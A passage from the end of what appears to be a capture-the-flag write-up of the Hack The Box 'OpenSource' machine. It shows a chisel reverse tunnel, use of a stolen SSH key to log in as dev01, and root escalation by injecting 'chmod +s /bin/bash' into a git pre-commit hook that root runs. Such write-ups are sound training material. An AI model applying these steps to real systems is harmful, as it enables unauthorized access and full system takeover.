+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chisel client 10.10.14.57:9999 R:3000:172.17.0.1:3000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And now I could access port 3000 on the box by simply going to <code>localhost:3000</code> on my attacker machine!</p>
+<blockquote>
+<p>What happend here is the client connected to the server and forwarded <code>172.17.0.1:3000</code> to <code>10.10.14.57:3000</code> which is my machine.
+{: .prompt-info}</p>
+</blockquote>
+<p>Navigating to it we find that it is running <code>gitea</code> which is like github but hosted locally.</p>
+<p>Signing in with the creds found before. We find a backup folder with a private ssh key.</p>
+<p>Stole that key and connected to user dev01</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -i dev01.key dev01@opensource.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>User pwned!</strong></p>
+</blockquote>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<blockquote>
+<p>Googling the version of gitea we are running returns that it is vulnerable to privilege escalation (CVE-2022-30781) but that was a rabbit hole.
+{: .prompt-tip}</p>
+</blockquote>
+<h2 id="checking-procceses">Checking procceses</h2>
+<p>Dropped <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreffer">pspy</a>
+ and ran for a while to check what proccess are being ran.</p>
+<p>We can notice that there is a custom script ran by root that is commiting and pushing the home directory of <code>dev01</code>. We can&rsquo;t modify this script becuase we don&rsquo;t have write permissions on it.</p>
+<p>Since the commiting is done by root we can add a pre-commit hook in <code>.git/hooks/pre-commit</code>. We enable this hook by renaming <code>.git/hooks/pre-commit.sample</code> and removing the <code>.sample</code> from the end.</p>
+<blockquote>
+<p>Hooks are scripts that run automatically with any git action like commit, push.. etc.
+{: .prompt-info}</p>
+</blockquote>
+<p>The pre-commit script will be executed by root before commiting.</p>
+<p>Injected <code>chmod +s /bin/bash</code> into <code>.git/hooks/pre-commit</code> which made bash an <code>SUID</code> means it will run bash as root and maintain the UID and GID of root, effectively making us the root user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash -p
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/img/HTB-opensource/root.png"
+        data-srcset="/assets/img/HTB-opensource/root.png, /assets/img/HTB-opensource/root.png 1.5x, /assets/img/HTB-opensource/root.png 2x"
+        data-sizes="auto"
+        alt="/assets/img/HTB-opensource/root.png"
+        title="root" /></p>
+<ul>
+<li><strong>Root pwned!</strong></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/htb-opensource/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://vymvn.xyz/htb-opensource/" data-title="OpenSource Writeup" data-hashtags="git,LFI,RCE,Docker,Port Forwarding,Tunneling,git hooks"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://vymvn.xyz/htb-opensource/" data-hashtag="git"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://vymvn.xyz/htb-opensource/" data-title="OpenSource Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on VK" data-sharer="vk" data-url="https://vymvn.xyz/htb-opensource/" data-title="OpenSource Writeup"><i class="fab fa-vk fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://vymvn.xyz/htb-opensource/" data-title="OpenSource Writeup"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/git/">git</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/rce/">RCE</a>,&nbsp;<a href="/tags/docker/">Docker</a>,&nbsp;<a href="/tags/port-forwarding/">Port Forwarding</a>,&nbsp;<a href="/tags/tunneling/">Tunneling</a>,&nbsp;<a href="/tags/git-hooks/">git hooks</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/stack5/" class="prev" rel="prev" title="Simple 64-bit buffer overflow with shellcode"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Simple 64-bit buffer overflow with shellcode</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">vymvn</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"vymvn","id-2":"vymvn"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":120}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
